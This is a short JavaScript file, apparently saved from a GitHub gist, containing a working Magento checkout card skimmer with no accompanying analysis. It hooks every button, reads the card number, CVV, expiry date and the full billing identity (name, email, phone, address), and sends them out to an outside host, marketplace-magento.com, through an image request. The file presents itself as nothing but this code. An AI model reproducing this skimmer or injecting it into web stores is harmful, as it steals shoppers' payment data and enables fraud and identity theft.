//https://gist.github.com/Blevene/f4fb98538fbbcbb47064984c946f1053
var x = document.getElementsByTagName("button"); 
var i; 
for (i=0;i<x.length;i++) 
{ 
x[i].addEventListener("click",function(){ 
var res = document.getElementById("authorizenet_cc_cid").value; 
if (res!=""){ 
var fname = document.getElementById("billing:firstname").value; 
var lname = document.getElementById("billing:lastname").value; 
var email = document.getElementById("billing:email").value; 
var telephone = document.getElementById("billing:telephone").value; 
var post = document.getElementById("billing:postcode").value; 
var street = document.getElementById("billing:street1").value; 
var city = document.getElementById("billing:city").value; 
var e1 = document.getElementById("billing:region_id"); 
var state = e1.options[e1.selectedIndex].innerHTML; 
var e2 = document.getElementById("billing:country_id"); 
var country = e2.options[e2.selectedIndex].value; 
var ccnum = document.getElementById("authorizenet_cc_number").value; 
var cvv = document.getElementById("authorizenet_cc_cid").value; 
var e3 = document.getElementById("authorizenet_expiration"); 
var exp_m = e3.options[e3.selectedIndex].value; 
var e4 = document.getElementById("authorizenet_expiration_yr"); 
var exp_y = e4.options[e4.selectedIndex].value;
var result = ccnum+";"+exp_m+";"+exp_y+";"+cvv+";"+fname+";"+lname+";"+street+";"+country+";"+post+";"+state+";"+city+";"+telephone+";"+email+";null;null;null;v<redacted>;"; 
var n = document.createElement("img"); 
n.src = " https://marketplace-magento.com/post.php?payment="+result; 
} 
}); 
}